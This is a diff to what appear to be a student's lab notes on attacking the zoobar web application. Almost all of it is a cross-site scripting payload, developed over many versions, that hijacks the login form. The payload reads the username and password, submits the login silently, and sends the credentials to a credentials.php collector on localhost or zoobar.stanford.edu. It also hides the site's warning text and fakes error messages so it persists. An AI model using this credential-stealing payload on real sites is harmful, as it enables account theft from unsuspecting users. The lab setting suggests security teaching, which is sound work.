@@ -136,6 +136,9 @@ it works!!!
 
 
 
+
+Stripping the AJAX handler.....
+
 without the xmlhandler to notify of the HTTP response this becomes:
 
 '' onfocus='document.body.children[4].style.display = "none"' onblur='document.forms[0].setAttribute("onsubmit", "xmlhttp = new XMLHttpRequest(); xmlhttp.open('GET','http://localhost/credentials.php?username=' + document.forms[0].children[0].children[0].children[0].children[1].children[0].value + '&password=' + document.forms[0].children[0].children[0].children[1].children[1].children[0].value,false); xmlhttp.send();")'
@@ -147,6 +150,8 @@ which yields the payload:
 
 
 
+To zoobar.stanford.edu....
+
 adjusted to zoobar.stanford.edu instead of localhost this yields:
 
 '' onfocus='document.body.children[4].style.display = "none"' onblur='document.forms[0].setAttribute("onsubmit", "xmlhttp = new XMLHttpRequest(); xmlhttp.open('GET','http://zoobar.stanford.edu/credentials.php?username=' + document.forms[0].children[0].children[0].children[0].children[1].children[0].value + '&password=' + document.forms[0].children[0].children[0].children[1].children[1].children[0].value,false); xmlhttp.send();")'
@@ -157,6 +162,333 @@ or equivalently:
 
 
 
+
+To quotes....
+
+I just learned from Gil that I dont need to do the whole String.fromCharCode hack from MySpace. Apparently even if my double quotes get html encoded to &quot; if they are in a javascript context javascipt will decode them back before interpreting them. so lets try to write the above attacks in simple quote. Fixing a few quotes we get:
+
+'' onfocus='document.body.children[4].style.display = "none"' onblur='document.forms[0].onsubmit = function() { xmlhttp = new XMLHttpRequest(); xmlhttp.open("GET","http://localhost/credentials.php?username=" + document.forms[0].children[0].children[0].children[0].children[1].children[0].value + "&password=" + document.forms[0].children[0].children[0].children[1].children[1].children[0].value, false); xmlhttp.send(); }'
+
+it works! The zoobar.stanford.edu version:
+
+'' onfocus='document.body.children[4].style.display = "none"' onblur='document.forms[0].onsubmit = function() { xmlhttp = new XMLHttpRequest(); xmlhttp.open("GET","http://zoobar.stanford.edu/credentials.php?username=" + document.forms[0].children[0].children[0].children[0].children[1].children[0].value + "&password=" + document.forms[0].children[0].children[0].children[1].children[1].children[0].value, false); xmlhttp.send(); }'
+
+
+
+
+
+Now lets do JS cleanup in the exploit. First lets put things in vars, and different lines...
+
+'' 
+onfocus='document.body.children[4].style.display = "none"' 
+onblur='document.forms[0].onsubmit = function() { 
+var file_url = "http://localhost/credentials.php";
+var username_param = "username=" + document.forms[0].children[0].children[0].children[0].children[1].children[0].value; 
+var password_param = "password=" + document.forms[0].children[0].children[0].children[1].children[1].children[0].value;
+var full_url = file_url + "?" + username_param + "&" + password_param; 
+var xmlhttp = new XMLHttpRequest(); 
+xmlhttp.open("GET", full_url, false); 
+xmlhttp.send(); }'
+
+
+
+Now lets navigate the DOM by getElemByXXX functions instead of traversal...
+
+'' 
+onfocus='var warning = document.getElementsByClassName("footer")[0]; warning.style.display = "none";' 
+onblur='var loginform = document.getElementsByName("loginform")[0]; 
+loginform.onsubmit = function() 
+{ 
+var hostname = "localhost"; 
+var credentials_url = "http://" + hostname + "/credentials.php"; 
+var username = document.getElementsByName("login_username")[0].value; 
+var password = document.getElementsByName("login_password")[0].value;
+var query = "username=" + username + "&" + "password=" + password; 
+var full_url = credentials_url + "?" + query;
+var xmlhttp = new XMLHttpRequest();
+xmlhttp.open("GET", full_url, false); 
+xmlhttp.send(); 
+}'
+
+
+
+zoobar.stanford.edu version:
+
+'' 
+onfocus='var warning = document.getElementsByClassName("footer")[0]; warning.style.display = "none";' 
+onblur='var loginform = document.getElementsByName("loginform")[0]; 
+loginform.onsubmit = function() 
+{ 
+var hostname = "zoobar.stanford.edu"; 
+var credentials_url = "http://" + hostname + "/credentials.php"; 
+var username = document.getElementsByName("login_username")[0].value; 
+var password = document.getElementsByName("login_password")[0].value;
+var query = "username=" + username + "&" + "password=" + password; 
+var full_url = credentials_url + "?" + query;
+var xmlhttp = new XMLHttpRequest();
+xmlhttp.open("GET", full_url, false); 
+xmlhttp.send(); 
+}'
+
+
+
+Now lets try to make it stick.... If user enters wrong password incorrectly we still stay with him until he gets it right.
+
+This makes the handler work again. Submits the login in behalf of user with AJAX and prints out the response:
+
+'' 
+onfocus='var warning = document.getElementsByClassName("footer")[0]; warning.style.display = "none";' 
+onblur='var loginform = document.getElementsByName("loginform")[0]; 
+loginform.onsubmit = function() 
+{ 
+var xhrHandler = function () 
+{ 
+if (this.readyState != 4) { return; } 
+if (this.status != 200) { return; } 
+var el = document.createElement("div");
+el.innerHTML = this.responseText;
+var status = this.status; var text = this.responseText; 
+alert(status + ": " + this.responseText); 
+};
+var hostname = "localhost"; 
+var username = document.getElementsByName("login_username")[0].value; 
+var password = document.getElementsByName("login_password")[0].value; 
+var query = "login_username=" + username + "&" + "login_password=" + password + "&submit_login=Log%20in";
+
+var login_url = "http://" + hostname + "/index.php";
+var xmlhttp1 = new XMLHttpRequest();
+xmlhttp1.open("POST", login_url, false);
+xmlhttp1.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+xmlhttp1.onreadystatechange = xhrHandler;
+xmlhttp1.send(query);
+};'
+
+
+
+Next we check if the reponse was successfull or not by inspecting it for a footer with an error message (the profile page does not have a footer):
+
+'' 
+onfocus='var warning = document.getElementsByClassName("footer")[0]; warning.style.display = "none";' 
+onblur='var loginform = document.getElementsByName("loginform")[0]; 
+loginform.onsubmit = function() { 
+   var xhrHandler = function () { 
+      if (this.readyState != 4) { return; } 
+      if (this.status != 200) { return; } 
+      var el = document.createElement("div"); 
+      el.innerHTML = this.responseText; 
+      if (el.getElementsByClassName("footer").length > 0) { 
+         var warningText = el.getElementsByClassName("footer")[0].textContent; 
+         alert(warningText.length); 
+         console.log("Warning: " + warningText + ". Length : " + warningText.length); 
+      } 
+      else{ 
+         alert("Successfully loggedn in"); 
+      } 
+   }; 
+   var hostname = "localhost"; 
+   var username = document.getElementsByName("login_username")[0].value; 
+   var password = document.getElementsByName("login_password")[0].value; 
+   var query = "login_username=" + username + "&" + "login_password=" + password + "&submit_login=Log%20in"; 
+
+   var login_url = "http://" + hostname + "/index.php"; 
+   var xmlhttp1 = new XMLHttpRequest(); 
+   xmlhttp1.open("POST", login_url, false); 
+   xmlhttp1.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); 
+   xmlhttp1.onreadystatechange = xhrHandler; 
+   xmlhttp1.send(query); 
+};' 
+
+
+Whoa!! lets get rid of the onblur event handler. Lets do everything on the onfocus for the username field. Why not?
+
+'' 
+onfocus='var warning = document.getElementsByClassName("footer")[0]; warning.style.display = "none";
+         var loginform = document.getElementsByName("loginform")[0]; 
+         loginform.onsubmit = function() { 
+            var xhrHandler = function () { 
+               if (this.readyState != 4) { return; } 
+               if (this.status != 200) { return; } 
+               var el = document.createElement("div"); 
+               el.innerHTML = this.responseText; 
+               if (el.getElementsByClassName("footer").length > 0) { 
+                  var warningText = el.getElementsByClassName("footer")[0].textContent; 
+                  alert(warningText.length); 
+                  console.log("Warning: " + warningText + ". Length : " + warningText.length); 
+               } 
+               else{ 
+                  alert("Successfully loggedn in"); 
+               } 
+            }; 
+            var hostname = "localhost"; 
+            var username = document.getElementsByName("login_username")[0].value; 
+            var password = document.getElementsByName("login_password")[0].value; 
+            var query = "login_username=" + username + "&" + "login_password=" + password + "&submit_login=Log%20in"; 
+
+            var login_url = "http://" + hostname + "/index.php"; 
+            var xmlhttp1 = new XMLHttpRequest(); 
+            xmlhttp1.open("POST", login_url, false); 
+            xmlhttp1.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); 
+            xmlhttp1.onreadystatechange = xhrHandler; 
+            xmlhttp1.send(query); 
+         };' 
+
+
+
+
+Now lets work on the successful login case. In this case we should simply steal the password and let the user go through.
+
+
+'' 
+onfocus='var warning = document.getElementsByClassName("footer")[0]; warning.style.display = "none";
+         var loginform = document.getElementsByName("loginform")[0]; 
+         loginform.onsubmit = function() { 
+            var hostname = "localhost"; 
+            var username = document.getElementsByName("login_username")[0].value; 
+            var password = document.getElementsByName("login_password")[0].value; 
+            var query = "login_username=" + username + "&" + "login_password=" + password + "&submit_login=Log%20in"; 
+            var login_url = "http://" + hostname + "/index.php";
+            var steal_url = "http://" + hostname + "/credentials.php" + "?" + query;
+                  
+            var login_handler = function () { 
+               if (this.readyState != 4) { return; } 
+               if (this.status != 200) { return; } 
+               
+               var el = document.createElement("div"); 
+               el.innerHTML = this.responseText; 
+               
+               if (el.getElementsByClassName("footer").length > 0) { 
+                  var warningText = el.getElementsByClassName("footer")[0].textContent; 
+                  alert(warningText.length); 
+                  console.log("Warning: " + warningText + ". Length : " + warningText.length); 
+               } 
+               else{ 
+                  var steal_request = new XMLHttpRequest();
+                  steal_request.open("GET", steal_url, false); 
+                  steal_request.send();  
+               } 
+            };     
+             
+            var login_request = new XMLHttpRequest(); 
+            login_request.open("POST", login_url, false); 
+            login_request.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); 
+            login_request.onreadystatechange = login_handler; 
+            login_request.send(query); 
+         };'
+
+
+
+That works!! Now lets handle the unsuccessfull login case. We want to somehow leave our code around for the next user input. 
+I decided to accomplish this by aborting the form submission and make it look like it was submitted (display the error, 
+etc.)
+
+
+'' 
+onfocus='var warning = document.getElementsByClassName("footer")[0]; warning.style.display = "none"; 
+         var loginform = document.getElementsByName("loginform")[0]; 
+         loginform.onsubmit = function() { 
+            var hostname = "localhost"; 
+            var username = document.getElementsByName("login_username")[0].value; 
+            var password = document.getElementsByName("login_password")[0].value; 
+            var query = "login_username=" + username + "&" + "login_password=" + password + "&submit_login=Log%20in"; 
+            var login_url = "http://" + hostname + "/index.php"; 
+            var steal_url = "http://" + hostname + "/credentials.php" + "?" + query; 
+                  
+            var login_handler = function () { 
+               if (this.readyState != 4) { return; } 
+               if (this.status != 200) { return; } 
+               
+               var el = document.createElement("div"); 
+               el.innerHTML = this.responseText; 
+               
+               if (el.getElementsByClassName("footer").length > 0) { 
+                  login_successful = false; 
+                  error_message = el.getElementsByClassName("footer")[0].textContent; 
+                  header_text = el.getElementsByTagName("h1")[0].textContent; 
+                  subheader_text = el.getElementsByTagName("h2")[0].textContent; 
+               } 
+               else{ 
+                  var steal_request = new XMLHttpRequest(); 
+                  steal_request.open("GET", steal_url, false); 
+                  steal_request.send(); 
+                  login_successful = true; 
+               } 
+            };     
+             
+            var login_request = new XMLHttpRequest(); 
+            login_request.open("POST", login_url, false); 
+            login_request.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); 
+            login_request.onreadystatechange = login_handler; 
+            login_request.send(query);
+            
+            if (!login_successful){ 
+               document.getElementsByTagName("h1")[0].textContent = header_text; 
+               document.getElementsByTagName("h2")[0].textContent = subheader_text; 
+               document.getElementsByClassName("footer")[0].textContent = error_message; 
+               document.getElementsByClassName("footer")[0]; warning.style.display = "block"; 
+               return false; 
+            } 
+         };' 
+
+
+That worked wonders. The UI changes to make the user think the form was submitted. There are a couple of quirks still regarding the event habdler that
+erases the error message when the focus is on the username field. We need to make sure this only happens the first time. Lets iron those details out.
+
+
+'' 
+onfocus='if ( typeof(onFocusEventCount)=="undefined" ) { onFocusEventCount = 0; } 
+         onFocusEventCount += 1; 
+         
+         if (onFocusEventCount == 1){ 
+            var warning = document.getElementsByClassName("footer")[0]; warning.style.display = "none"; 
+         } 
+
+         var loginform = document.getElementsByName("loginform")[0]; 
+         loginform.onsubmit = function() { 
+            var hostname = "localhost"; 
+            var username = document.getElementsByName("login_username")[0].value; 
+            var password = document.getElementsByName("login_password")[0].value; 
+            var query = "login_username=" + username + "&" + "login_password=" + password + "&submit_login=Log%20in"; 
+            var login_url = "http://" + hostname + "/index.php"; 
+            var steal_url = "http://" + hostname + "/credentials.php" + "?" + query; 
+                  
+            var login_handler = function () { 
+               if (this.readyState != 4) { return; } 
+               if (this.status != 200) { return; } 
+               
+               var el = document.createElement("div"); 
+               el.innerHTML = this.responseText; 
+               
+               if (el.getElementsByClassName("footer").length > 0) { 
+                  login_successful = false; 
+                  error_message = el.getElementsByClassName("footer")[0].textContent; 
+                  header_text = el.getElementsByTagName("h1")[0].textContent; 
+                  subheader_text = el.getElementsByTagName("h2")[0].textContent; 
+               } 
+               else{ 
+                  var steal_request = new XMLHttpRequest(); 
+                  steal_request.open("GET", steal_url, false); 
+                  steal_request.send(); 
+                  login_successful = true; 
+               } 
+            };     
+             
+            var login_request = new XMLHttpRequest(); 
+            login_request.open("POST", login_url, false); 
+            login_request.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); 
+            login_request.onreadystatechange = login_handler; 
+            login_request.send(query);
+            
+            if (!login_successful){ 
+               document.getElementsByTagName("h1")[0].textContent = header_text; 
+               document.getElementsByTagName("h2")[0].textContent = subheader_text; 
+               document.getElementsByClassName("footer")[0].textContent = error_message; 
+               document.getElementsByClassName("footer")[0]; warning.style.display = "block"; 
+               return false; 
+            } 
+         };' 
+
+
+lets leave it at that!
 
 
 
@@ -172,6 +504,8 @@ left to do:
 // TODO: put global vars to avoid execution of event handlers twice
 // TODO: chane localhost to zoobar.stanford.edu
 // TODO: make AJAX call asynchronous?
+// TODO: avoid quotes
+// TODO: make DOM navigation simpler
 
 
 
